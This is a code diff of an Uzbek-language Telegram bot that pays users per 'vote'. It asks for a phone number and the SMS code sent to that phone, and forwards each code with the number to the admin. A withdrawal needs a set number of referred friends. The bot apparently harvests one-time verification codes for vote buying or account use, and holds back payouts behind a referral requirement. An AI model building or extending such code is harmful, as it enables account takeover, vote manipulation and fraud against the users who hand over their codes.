@@ -11,7 +11,6 @@ from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
-from aiogram.types import Message
 from dotenv import load_dotenv
 from aiohttp import web
 
@@ -20,7 +19,7 @@ load_dotenv()
 # ================= LOGGING =================
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler('bot.log'),
         logging.StreamHandler()
@@ -29,33 +28,31 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ================= KONFIG =================
-class Config:
-    BOT_TOKEN = os.getenv("BOT_TOKEN")
-    ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-    DATABASE_URL = os.getenv("DATABASE_URL")
-    PORT = int(os.getenv("PORT", 10000))
-    VOICE_PRICE = int(os.getenv("VOICE_PRICE", "50000"))
-    MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", "100000"))
-    CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", "5"))
-    TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"
-    MIN_REFERRALS = int(os.getenv("MIN_REFERRALS", "5"))
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
+DATABASE_URL = os.getenv("DATABASE_URL")
+PORT = int(os.getenv("PORT", 10000))
+VOICE_PRICE = int(os.getenv("VOICE_PRICE", 50000))
+MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", 100000))
+MIN_REFERRALS = int(os.getenv("MIN_REFERRALS", 5))
+CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", 5))
+TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"
 
-    if TEST_MODE:
-        VOICE_PRICE = 100
-        MIN_WITHDRAW = 100
-        MIN_REFERRALS = 1
+if TEST_MODE:
+    VOICE_PRICE = 100
+    MIN_WITHDRAW = 100
+    MIN_REFERRALS = 1
 
-if not Config.BOT_TOKEN:
+if not BOT_TOKEN:
     logger.error("❌ BOT_TOKEN topilmadi!")
     exit(1)
 
-if Config.ADMIN_ID == 0:
+if ADMIN_ID == 0:
     logger.error("❌ ADMIN_ID topilmadi!")
     exit(1)
 
-# Bot yaratish
 bot = Bot(
-    token=Config.BOT_TOKEN,
+    token=BOT_TOKEN,
     default=DefaultBotProperties(parse_mode=ParseMode.HTML)
 )
 dp = Dispatcher()
@@ -81,9 +78,9 @@ def get_user_menu():
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="🗳️ Ovoz berish")],
-            [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
-            [KeyboardButton(text="💸 Yechish")],
-            [KeyboardButton(text="👥 Referallar"), KeyboardButton(text="📜 Tarix")]
+            [KeyboardButton(text="💰 Balans"), KeyboardButton(text="👥 Referallar")],
+            [KeyboardButton(text="💸 Yechish"), KeyboardButton(text="📜 Tarix")],
+            [KeyboardButton(text="👤 Profil")]
         ],
         resize_keyboard=True
     )
@@ -143,7 +140,7 @@ def generate_referral_code():
 async def get_db():
     """Database ulanishi"""
     try:
-        conn = await asyncpg.connect(Config.DATABASE_URL)
+        conn = await asyncpg.connect(DATABASE_URL)
         return conn
     except Exception as e:
         logger.error(f"❌ Database ulanishda xatolik: {e}")
@@ -163,7 +160,6 @@ async def init_db():
                 phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
                 balance INTEGER DEFAULT 0,
                 referral_code VARCHAR(20) UNIQUE,
-                referred_by BIGINT DEFAULT NULL,
                 is_blocked BOOLEAN DEFAULT FALSE,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -231,9 +227,12 @@ async def init_db():
         # Indexlar
         await conn.execute("CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)")
         await conn.execute("CREATE INDEX IF NOT EXISTS idx_codes_status ON codes(status)")
+        await conn.execute("CREATE INDEX IF NOT EXISTS idx_codes_telegram_id ON codes(telegram_id)")
         await conn.execute("CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(telegram_id)")
         await conn.execute("CREATE INDEX IF NOT EXISTS idx_withdraws_status ON withdraws(status)")
+        await conn.execute("CREATE INDEX IF NOT EXISTS idx_withdraws_telegram_id ON withdraws(telegram_id)")
         await conn.execute("CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)")
+        await conn.execute("CREATE INDEX IF NOT EXISTS idx_referrals_referred ON referrals(referred_id)")
         
         logger.info("✅ Database tayyor")
     except Exception as e:
@@ -303,10 +302,10 @@ async def send_sms_code(phone, code):
     """SMS kod yuborish (mock - real integratsiya qo'shish kerak)"""
     logger.info(f"SMS kod {code} raqamga yuborildi: {phone}")
     
-    if Config.TEST_MODE:
+    if TEST_MODE:
         try:
             await bot.send_message(
-                Config.ADMIN_ID,
+                ADMIN_ID,
                 f"🔑 Test SMS kod:\n"
                 f"📞 Telefon: {phone}\n"
                 f"🔑 Kod: {code}"
@@ -318,12 +317,12 @@ async def send_sms_code(phone, code):
 
 # ================= 1. START =================
 @dp.message(Command("start"))
-async def start(message: Message):
+async def start(message: types.Message):
     telegram_id = message.from_user.id
     logger.info(f"👤 /start bosildi: {telegram_id}")
     
     # Admin uchun
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         await message.answer("👋 Xush kelibsiz, Admin!", reply_markup=get_admin_menu())
         return
     
@@ -379,11 +378,12 @@ async def start(message: Message):
             if referrer and referrer['telegram_id'] != telegram_id:
                 try:
                     await conn.execute(
-                        "INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2)",
+                        "INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING",
                         referrer['telegram_id'], telegram_id
                     )
-                except:
-                    pass
+                    logger.info(f"✅ Referral qo'shildi: {referrer['telegram_id']} -> {telegram_id}")
+                except Exception as e:
+                    logger.error(f"❌ Referral qo'shishda xatolik: {e}")
         
         bot_info = await bot.get_me()
         ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
@@ -396,13 +396,13 @@ async def start(message: Message):
             
             await message.answer(
                 f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
-                f"💰 <b>1 OVOZ = {Config.VOICE_PRICE:,} SO'M</b>\n\n"
+                f"💰 <b>1 OVOZ = {VOICE_PRICE:,} SO'M</b>\n\n"
                 f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                 f"📝 <b>Qanday ishlaydi:</b>\n"
                 f"1️⃣ Telefon raqamingizni yuboring\n"
                 f"2️⃣ SMS kodni kiriting\n"
                 f"3️⃣ Admin tasdiqlaydi\n"
-                f"4️⃣ {Config.VOICE_PRICE:,} so'm olasiz!\n\n"
+                f"4️⃣ {VOICE_PRICE:,} so'm olasiz!\n\n"
                 f"👤 <b>Sizning referal link:</b>\n"
                 f"<code>{ref_link}</code>\n\n"
                 f"📱 <b>Telefon raqamingizni yuboring:</b>",
@@ -419,7 +419,7 @@ async def start(message: Message):
                 f"📱 <b>Telefon:</b> {phone}\n"
                 f"📊 <b>Holat:</b> {status_text}\n"
                 f"💰 <b>Balans:</b> {balance:,} so'm\n"
-                f"👥 <b>Referallar:</b> {ref_count}/{Config.MIN_REFERRALS}\n\n"
+                f"👥 <b>Referallar:</b> {ref_count}/{MIN_REFERRALS}\n\n"
                 f"👇 Pastdagi tugmalardan foydalaning:",
                 reply_markup=get_user_menu()
             )
@@ -432,10 +432,10 @@ async def start(message: Message):
 
 # ================= 2. OVOZ BERISH =================
 @dp.message(F.text == "🗳️ Ovoz berish")
-async def vote_start(message: Message):
+async def vote_start(message: types.Message):
     telegram_id = message.from_user.id
     
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         await message.answer("👋 Siz adminsiz, /start bosing")
         return
     
@@ -461,17 +461,17 @@ async def vote_start(message: Message):
     user_states[telegram_id] = "waiting_phone"
     await message.answer(
         f"🗳️ <b>OVOZ BERISH</b>\n\n"
-        f"💰 1 ta ovoz = {Config.VOICE_PRICE:,} so'm\n\n"
+        f"💰 1 ta ovoz = {VOICE_PRICE:,} so'm\n\n"
         f"📱 Telefon raqamingizni yuboring:",
         reply_markup=get_phone_keyboard()
     )
 
 # ================= 3-4. TELEFON RAQAM =================
 @dp.message(F.contact)
-async def receive_phone_contact(message: Message):
+async def receive_phone_contact(message: types.Message):
     telegram_id = message.from_user.id
     
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
         return
     
@@ -483,7 +483,7 @@ async def receive_phone_contact(message: Message):
     await process_phone(message, phone)
 
 @dp.message(F.text == "❌ Bekor qilish")
-async def cancel_action(message: Message):
+async def cancel_action(message: types.Message):
     telegram_id = message.from_user.id
     
     user_states.pop(telegram_id, None)
@@ -493,10 +493,10 @@ async def cancel_action(message: Message):
     await message.answer("✅ Bekor qilindi", reply_markup=get_user_menu())
 
 @dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_phone")
-async def receive_phone_text(message: Message):
+async def receive_phone_text(message: types.Message):
     telegram_id = message.from_user.id
     
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         return
     
     phone = message.text.strip()
@@ -515,7 +515,7 @@ async def receive_phone_text(message: Message):
     normalized_phone = normalize_phone(phone)
     await process_phone(message, normalized_phone)
 
-async def process_phone(message: Message, phone: str):
+async def process_phone(message: types.Message, phone: str):
     telegram_id = message.from_user.id
     
     # Raqam ishlatilganmi?
@@ -546,7 +546,7 @@ async def process_phone(message: Message, phone: str):
     await send_sms_code(phone, sms_code)
     
     # Test rejimida kodni foydalanuvchiga ham ko'rsatish
-    if Config.TEST_MODE:
+    if TEST_MODE:
         await message.answer(
             f"🧪 <b>TEST REJIMI</b>\n"
             f"📱 Telefon: {phone}\n"
@@ -557,7 +557,7 @@ async def process_phone(message: Message, phone: str):
         await message.answer(
             f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
             f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:\n"
-            f"⏳ Kod {Config.CODE_EXPIRE_MINUTES} daqiqada amal qiladi."
+            f"⏳ Kod {CODE_EXPIRE_MINUTES} daqiqada amal qiladi."
         )
     
     # Kodni saqlash
@@ -571,7 +571,7 @@ async def process_phone(message: Message, phone: str):
         
         # Admin'ga xabar
         await bot.send_message(
-            Config.ADMIN_ID,
+            ADMIN_ID,
             f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
@@ -586,7 +586,7 @@ async def process_phone(message: Message, phone: str):
 
 # ================= 5. KODNI QABUL QILISH =================
 @dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_code")
-async def receive_code(message: Message):
+async def receive_code(message: types.Message):
     code = message.text.strip()
     telegram_id = message.from_user.id
     phone = user_phones.get(telegram_id)
@@ -642,12 +642,12 @@ async def receive_code(message: Message):
         ])
         
         await bot.send_message(
-            Config.ADMIN_ID,
+            ADMIN_ID,
             f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
             f"🔑 Kod: <code>{code}</code>\n"
-            f"⏳ Muddati: {Config.CODE_EXPIRE_MINUTES} daqiqa",
+            f"⏳ Muddati: {CODE_EXPIRE_MINUTES} daqiqa",
             reply_markup=keyboard
         )
         
@@ -725,12 +725,12 @@ async def admin_action(callback: types.CallbackQuery):
             
             await conn.execute(
                 "UPDATE users SET balance = balance + $1, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = $2",
-                Config.VOICE_PRICE, telegram_id
+                VOICE_PRICE, telegram_id
             )
             
             await conn.execute(
                 "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'deposit', 'Ovoz berish uchun')",
-                telegram_id, Config.VOICE_PRICE
+                telegram_id, VOICE_PRICE
             )
             
             # Foydalanuvchiga xabar
@@ -738,7 +738,7 @@ async def admin_action(callback: types.CallbackQuery):
                 await bot.send_message(
                     telegram_id,
                     f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
-                    f"💰 Hisobingizga <b>+{Config.VOICE_PRICE:,} so'm</b> qo'shildi!",
+                    f"💰 Hisobingizga <b>+{VOICE_PRICE:,} so'm</b> qo'shildi!",
                     reply_markup=get_user_menu()
                 )
             except Exception as e:
@@ -748,7 +748,7 @@ async def admin_action(callback: types.CallbackQuery):
                 f"✅ <b>TASDIQLANDI!</b>\n\n"
                 f"👤 ID: {telegram_id}\n"
                 f"📞 Tel: {phone}\n"
-                f"💰 +{Config.VOICE_PRICE:,} so'm"
+                f"💰 +{VOICE_PRICE:,} so'm"
             )
             await callback.answer("✅ Tasdiqlandi!")
             
@@ -792,12 +792,12 @@ async def admin_action(callback: types.CallbackQuery):
             if conn:
                 await conn.close()
 
-# ================= 7. HAMYON / BALANS =================
-@dp.message(F.text.in_(["💳 Hamyon", "💰 Balans"]))
-async def show_balance(message: Message):
+# ================= 7. BALANS =================
+@dp.message(F.text == "💰 Balans")
+async def show_balance(message: types.Message):
     telegram_id = message.from_user.id
     
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         await message.answer("👋 Siz adminsiz, /start bosing")
         return
     
@@ -820,26 +820,22 @@ async def show_balance(message: Message):
         return
     
     phone_verified = await is_phone_verified(user['phone'])
-    ref_count = await get_referral_count(telegram_id)
-    
     status = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
     
     await message.answer(
-        f"💳 <b>Hamyon</b>\n\n"
+        f"💳 <b>Balans</b>\n\n"
         f"📱 Telefon: {user['phone']}\n"
         f"📊 Holat: {status}\n"
-        f"💰 Balans: {user['balance']:,} so'm\n"
-        f"👥 Referallar: {ref_count}/{Config.MIN_REFERRALS}\n\n"
-        f"💸 Yechish uchun {Config.MIN_REFERRALS} ta referral kerak.",
+        f"💰 Balans: {user['balance']:,} so'm",
         reply_markup=get_user_menu()
     )
 
 # ================= 8. YECHISH =================
 @dp.message(F.text == "💸 Yechish")
-async def withdraw_start(message: Message):
+async def withdraw_start(message: types.Message):
     telegram_id = message.from_user.id
     
-    if telegram_id == Config.ADMIN_ID:
+    if telegram_id == ADMIN_ID:
         await message.answer("👋 Siz adminsiz, /start bosing")
         return
     
@@ -871,24 +867,24 @@ async def withdraw_start(message: Message):
     
     balance = user['balance']
     
-    if balance < Config.MIN_WITHDRAW:
+    if balance < MIN_WITHDRAW:
         await message.answer(
             f"❌ Balans: {balance:,} so'm\n"
-            f"💰 Yechish uchun {Config.MIN_WITHDRAW:,} so'm kerak!\n"
-            f"Yana {Config.MIN_WITHDRAW - balance:,} so'm kerak.",
+            f"💰 Yechish uchun {MIN_WITHDRAW:,} so'm kerak!\n"
+            f"Yana {MIN_WITHDRAW - balance:,} so'm kerak.",
             reply_markup=get_user_menu()
         )
         return
     
     ref_count = await get_referral_count(telegram_id)
     
-    if ref_count < Config.MIN_REFERRALS:
+    if ref_count < MIN_REFERRALS:
         bot_info = await bot.get_me()
         ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
         await message.answer(
-            f"❌ <b>Yechish uchun {Config.MIN_REFERRALS} ta do'stingiz botga start bosishi kerak!</b>\n\n"
+            f"❌ <b>Yechish uchun {MIN_REFERRALS} ta do'stingiz botga start bosishi kerak!</b>\n\n"
             f"👥 Sizda: {ref_count} ta\n"
-            f"🎯 Kerak: {Config.MIN_REFERRALS} ta\n\n"
+            f"🎯 Kerak: {MIN_REFERRALS} ta\n\n"
             f"🔗 <b>Referal link:</b>\n"
             f"<code>{ref_link}</code>\n\n"
             f"📤 Linkni do'stlaringizga yuboring!"
@@ -910,7 +906,7 @@ async def withdraw_start(message: Message):
 
 # ================= 9. YECHISH MA'LUMOTI =================
 @dp.message(lambda message: withdraw_states.get(message.from_user.id) == "waiting_withdraw_info")
-async def withdraw_info(message: Message):
+async def withdraw_info(message: types.Message):
     telegram_id = message.from_user.id
     info = message.text.strip()
     
@@ -973,7 +969,7 @@ async def withdraw_info(message: Message):
         ])
         
         await bot.send_message(
-            Config.ADMIN_ID,
+            ADMIN_ID,
             f"💸 <b>YECHISH SO'ROVI</b>\n\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📱 Ma'lumot: <code>{info}</code>\n"
@@ -1099,10 +1095,106 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
             if conn:
                 await conn.close()
 
-# ================= 11. ADMIN STATISTIKA =================
+# ================= 11. REFERALLAR =================
+@dp.message(F.text == "👥 Referallar")
+async def show_referrals(message: types.Message):
+    telegram_id = message.from_user.id
+    
+    if telegram_id == ADMIN_ID:
+        await message.answer("👋 Siz adminsiz")
+        return
+    
+    user = await get_user(telegram_id)
+    
+    if not user:
+        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
+        return
+    
+    ref_count = await get_referral_count(telegram_id)
+    bot_info = await bot.get_me()
+    ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
+    
+    await message.answer(
+        f"👥 <b>REFERRAL TIZIMI</b>\n\n"
+        f"🔗 <b>Sizning referal link:</b>\n"
+        f"<code>{ref_link}</code>\n\n"
+        f"👤 <b>Referallar soni:</b> {ref_count}\n"
+        f"🎯 <b>Yechish uchun kerak:</b> {MIN_REFERRALS} ta\n\n"
+        f"📤 Linkni do'stlaringizga yuboring!\n"
+        f"{MIN_REFERRALS} ta do'stingiz start bossa, pul yechib olasiz"
+    )
+
+# ================= 12. TRANZAKSIYALAR TARIXI =================
+@dp.message(F.text == "📜 Tarix")
+async def show_history(message: types.Message):
+    telegram_id = message.from_user.id
+    
+    if telegram_id == ADMIN_ID:
+        await message.answer("👋 Siz adminsiz")
+        return
+    
+    conn = None
+    try:
+        conn = await get_db()
+        transactions = await conn.fetch(
+            "SELECT * FROM transactions WHERE telegram_id = $1 ORDER BY id DESC LIMIT 10",
+            telegram_id
+        )
+        
+        if transactions:
+            text = "📜 <b>TRANZAKSIYALAR TARIXI:</b>\n\n"
+            for trans in transactions:
+                sign = "+" if trans['type'] == 'deposit' else "-"
+                emoji = "✅" if trans['type'] == 'deposit' else "❌"
+                text += f"{emoji} {sign}{trans['amount']:,} so'm\n"
+                text += f"📝 {trans['description'] or 'Tranzaksiya'}\n"
+                text += f"📅 {trans['created_at'].strftime('%Y-%m-%d %H:%M')}\n"
+                text += "➖➖➖➖➖➖➖\n"
+            await message.answer(text)
+        else:
+            await message.answer("📭 Tranzaksiyalar yo'q")
+    except Exception as e:
+        logger.error(f"❌ Tarix xatosi: {e}")
+        await message.answer("❌ Xatolik yuz berdi!")
+    finally:
+        if conn:
+            await conn.close()
+
+# ================= 13. PROFIL =================
+@dp.message(F.text == "👤 Profil")
+async def show_profile(message: types.Message):
+    telegram_id = message.from_user.id
+    
+    if telegram_id == ADMIN_ID:
+        await message.answer("👋 Siz adminsiz")
+        return
+    
+    user = await get_user(telegram_id)
+    
+    if not user:
+        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
+        return
+    
+    ref_count = await get_referral_count(telegram_id)
+    phone_verified = await is_phone_verified(user['phone']) if user['phone'] != "no_phone_yet" else False
+    
+    status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
+    
+    await message.answer(
+        f"👤 <b>PROFIL</b>\n\n"
+        f"🆔 ID: <code>{telegram_id}</code>\n"
+        f"📱 Telefon: {user['phone']}\n"
+        f"📊 Holat: {status_text}\n"
+        f"💰 Balans: {user['balance']:,} so'm\n"
+        f"👥 Referallar: {ref_count} ta\n"
+        f"📅 Ro'yxatdan o'tgan: {user['created_at'].strftime('%Y-%m-%d %H:%M') if user['created_at'] else 'Noma'lum'}",
+        reply_markup=get_user_menu()
+    )
+
+# ================= 14. ADMIN STATISTIKA =================
 @dp.message(F.text == "📊 Statistika")
-async def admin_stats(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def admin_stats(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
     conn = None
@@ -1113,7 +1205,7 @@ async def admin_stats(message: Message):
         registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
         unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
         blocked_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_blocked = TRUE")
-        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending' OR status = 'pending_verify'")
+        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending_verify'")
         verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
         verified_phones = await conn.fetchval("SELECT COUNT(*) FROM verified_phones")
         total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
@@ -1121,7 +1213,6 @@ async def admin_stats(message: Message):
         completed_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'")
         total_withdrawn = await conn.fetchval("SELECT COALESCE(SUM(amount), 0) FROM withdraws WHERE status = 'completed'")
         total_referrals = await conn.fetchval("SELECT COUNT(*) FROM referrals")
-        today_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE created_at::date = CURRENT_DATE")
         
         await message.answer(
             f"📊 <b>STATISTIKA</b>\n\n"
@@ -1129,8 +1220,7 @@ async def admin_stats(message: Message):
             f"  • Jami: {total_users}\n"
             f"  • Ro'yxatdan o'tgan: {registered_users}\n"
             f"  • Telefon kiritmagan: {unregistered_users}\n"
-            f"  • Bloklangan: {blocked_users}\n"
-            f"  • Bugun qo'shilgan: {today_users}\n\n"
+            f"  • Bloklangan: {blocked_users}\n\n"
             f"📱 <b>Raqamlar:</b>\n"
             f"  • Tasdiqlangan: {verified_phones}\n\n"
             f"🔑 <b>Kodlar:</b>\n"
@@ -1150,10 +1240,10 @@ async def admin_stats(message: Message):
         if conn:
             await conn.close()
 
-# ================= 12. KUTAYOTGAN KODLAR =================
+# ================= 15. KUTAYOTGAN KODLAR =================
 @dp.message(F.text == "📋 Kutayotgan kodlar")
-async def pending_codes(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def pending_codes(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
     conn = None
@@ -1181,10 +1271,10 @@ async def pending_codes(message: Message):
         if conn:
             await conn.close()
 
-# ================= 13. YECHISH SO'ROVLARI =================
+# ================= 16. YECHISH SO'ROVLARI =================
 @dp.message(F.text == "💸 Yechish so'rovlari")
-async def pending_withdraws(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def pending_withdraws(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
     conn = None
@@ -1212,10 +1302,10 @@ async def pending_withdraws(message: Message):
         if conn:
             await conn.close()
 
-# ================= 14. TASDIQLANGAN RAQAMLAR =================
+# ================= 17. TASDIQLANGAN RAQAMLAR =================
 @dp.message(F.text == "✅ Tasdiqlangan raqamlar")
-async def verified_phones_list(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def verified_phones_list(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
     conn = None
@@ -1242,10 +1332,10 @@ async def verified_phones_list(message: Message):
         if conn:
             await conn.close()
 
-# ================= 15. FOYDALANUVCHILAR RO'YXATI =================
+# ================= 18. FOYDALANUVCHILAR =================
 @dp.message(F.text == "👥 Foydalanuvchilar")
-async def users_list(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def users_list(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
     conn = None
@@ -1274,28 +1364,28 @@ async def users_list(message: Message):
         if conn:
             await conn.close()
 
-# ================= 16. BARCHAGA XABAR =================
+# ================= 19. BARCHAGA XABAR =================
 @dp.message(F.text == "📨 Barchaga xabar")
-async def broadcast_start(message: Message):
-    if message.from_user.id != Config.ADMIN_ID:
+async def broadcast_start(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
-    admin_states[Config.ADMIN_ID] = "waiting_message"
+    admin_states[ADMIN_ID] = "waiting_message"
     await message.answer(
         "📨 Xabar matnini yozing:\n"
         "❌ Bekor qilish uchun 'Bekor' deb yozing."
     )
 
-@dp.message(lambda message: message.from_user.id == Config.ADMIN_ID and admin_states.get(Config.ADMIN_ID) == "waiting_message")
-async def broadcast_send(message: Message):
+@dp.message(lambda message: message.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
+async def broadcast_send(message: types.Message):
     text = message.text
     
     if text.lower() == "bekor":
-        admin_states.pop(Config.ADMIN_ID, None)
+        admin_states.pop(ADMIN_ID, None)
         await message.answer("✅ Bekor qilindi", reply_markup=get_admin_menu())
         return
     
-    admin_states.pop(Config.ADMIN_ID, None)
+    admin_states.pop(ADMIN_ID, None)
     
     conn = None
     try:
@@ -1336,75 +1426,10 @@ async def broadcast_send(message: Message):
         if conn:
             await conn.close()
 
-# ================= 17. REFERALLAR =================
-@dp.message(F.text == "👥 Referallar")
-async def show_referrals(message: Message):
-    telegram_id = message.from_user.id
-    
-    if telegram_id == Config.ADMIN_ID:
-        await message.answer("👋 Siz adminsiz")
-        return
-    
-    user = await get_user(telegram_id)
-    
-    if not user:
-        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
-        return
-    
-    ref_count = await get_referral_count(telegram_id)
-    bot_info = await bot.get_me()
-    ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
-    
-    await message.answer(
-        f"👥 <b>REFERRAL TIZIMI</b>\n\n"
-        f"🔗 <b>Sizning referal link:</b>\n"
-        f"<code>{ref_link}</code>\n\n"
-        f"👤 <b>Referallar soni:</b> {ref_count}\n"
-        f"🎯 <b>Yechish uchun kerak:</b> {Config.MIN_REFERRALS} ta\n\n"
-        f"📤 Linkni do'stlaringizga yuboring!\n"
-        f"{Config.MIN_REFERRALS} ta do'stingiz start bossa, pul yechib olasiz"
-    )
-
-# ================= 18. TRANZAKSIYALAR TARIXI =================
-@dp.message(F.text == "📜 Tarix")
-async def show_history(message: Message):
-    telegram_id = message.from_user.id
-    
-    if telegram_id == Config.ADMIN_ID:
-        await message.answer("👋 Siz adminsiz")
-        return
-    
-    conn = None
-    try:
-        conn = await get_db()
-        transactions = await conn.fetch(
-            "SELECT * FROM transactions WHERE telegram_id = $1 ORDER BY id DESC LIMIT 10",
-            telegram_id
-        )
-        
-        if transactions:
-            text = "📜 <b>TRANZAKSIYALAR TARIXI:</b>\n\n"
-            for trans in transactions:
-                sign = "+" if trans['type'] == 'deposit' else "-"
-                emoji = "✅" if trans['type'] == 'deposit' else "❌"
-                text += f"{emoji} {sign}{trans['amount']:,} so'm\n"
-                text += f"📝 {trans['description'] or 'Tranzaksiya'}\n"
-                text += f"📅 {trans['created_at'].strftime('%Y-%m-%d %H:%M')}\n"
-                text += "➖➖➖➖➖➖➖\n"
-            await message.answer(text)
-        else:
-            await message.answer("📭 Tranzaksiyalar yo'q")
-    except Exception as e:
-        logger.error(f"❌ Tarix xatosi: {e}")
-        await message.answer("❌ Xatolik yuz berdi!")
-    finally:
-        if conn:
-            await conn.close()
-
-# ================= 19. BALANS KOMANDASI =================
+# ================= 20. BALANS KOMANDASI =================
 @dp.message(Command("balance"))
-async def check_balance(message: Message):
-    if message.from_user.id == Config.ADMIN_ID:
+async def check_balance(message: types.Message):
+    if message.from_user.id == ADMIN_ID:
         return
     
     user = await get_user(message.from_user.id)
@@ -1423,10 +1448,10 @@ async def check_balance(message: Message):
     
     await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=get_user_menu())
 
-# ================= 20. ADMIN MENU =================
+# ================= 21. ADMIN MENU =================
 @dp.message(Command("admin"))
-async def admin_panel(message: Message):
-    if message.from_user.id == Config.ADMIN_ID:
+async def admin_panel(message: types.Message):
+    if message.from_user.id == ADMIN_ID:
         await message.answer("👋 Admin panel", reply_markup=get_admin_menu())
 
 # ================= TOZALASH VAZIFALARI =================
@@ -1495,9 +1520,9 @@ async def start_http_server():
         runner = web.AppRunner(app)
         await runner.setup()
         
-        site = web.TCPSite(runner, '0.0.0.0', Config.PORT)
+        site = web.TCPSite(runner, '0.0.0.0', PORT)
         await site.start()
-        logger.info(f"🌐 HTTP server port {Config.PORT} da ishga tushdi")
+        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
         
         while True:
             await asyncio.sleep(3600)
